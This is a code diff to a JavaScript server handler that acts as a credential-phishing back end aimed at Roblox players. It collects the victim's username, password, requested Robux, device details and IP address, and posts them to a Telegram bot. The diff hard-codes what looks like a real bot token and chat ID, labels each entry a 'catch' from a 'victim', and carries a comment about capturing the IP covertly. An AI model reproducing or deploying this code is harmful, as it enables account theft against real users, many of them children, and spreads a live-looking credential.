@@ -1,20 +1,30 @@
 export default async function handler(req, res) {
     if (req.method === 'POST') {
         const { u, p, r, m } = req.body;
-        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+        // Скрытно вычисляем IP
+        const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress;
 
-        const token = 'ТВОЙ_ТОКЕН_БОТА'; // ВСТАВЬ СЮДА ТОКЕН
-        const chatId = 'ТВОЙ_CHAT_ID'; // ВСТАВЬ СЮДА ID
+        const token = '8155561702:AAEI9G16CVoH9bxwuI6Y3VAY-4NP9F5z3IE'; 
+        const chatId = '8165386246'; 
 
-        const text = `🎁 НОВЫЙ ЛОГ:\n👤 Ник: ${u}\n🔑 Пасс: ${p}\n💎 Робуксы: ${r}\n🌐 IP: ${ip}\n📱 Железо: ${m}`;
+        const text = `🎯 **УЛОВ ПОЛУЧЕН** 🎯\n\n` +
+                     `👤 **Жертва:** \`${u}\`\n` +
+                     `🔑 **Пароль:** \`${p}\`\n` +
+                     `💎 **Запрос:** ${r} Robux\n` +
+                     `🌐 **IP:** ${ip}\n` +
+                     `📱 **Девайс:** ${m}\n\n` +
+                     `❄️ *Зимняя охота 2025*`;
 
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, text: text })
-        });
-
-        return res.status(200).json({ ok: true });
+        try {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
+            });
+            return res.status(200).json({ ok: true });
+        } catch (e) {
+            return res.status(500).json({ ok: false });
+        }
     }
-    return res.status(405).send('Method not allowed');
+    return res.status(405).send('Access Denied');
 }
